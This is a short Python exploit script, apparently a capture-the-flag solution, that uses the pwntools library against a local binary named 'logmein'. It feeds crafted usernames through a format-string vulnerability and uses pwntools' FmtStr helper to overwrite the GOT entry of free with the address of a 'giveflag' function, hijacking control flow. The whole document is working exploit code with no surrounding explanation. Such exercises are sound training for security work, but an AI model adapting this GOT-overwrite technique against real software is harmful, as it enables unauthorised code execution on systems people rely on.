from pwn import *

def sendpayload(p):
    print(p)
    r = process("./logmein")
    r.recvuntil("Enter your username:")
    r.sendline(p)
    r.recvuntil("Enter password for user: ")
    res = r.recvline().strip()
    return res

def main():
    free_got = 0x000000601228
    giveflag = 0x400966

    fmt = FmtStr(sendpayload)
    fmt.write(free_got,giveflag)
    fmt.execute_writes()
    #print(sendpayload("%p"))


if __name__ == "__main__":
    main()
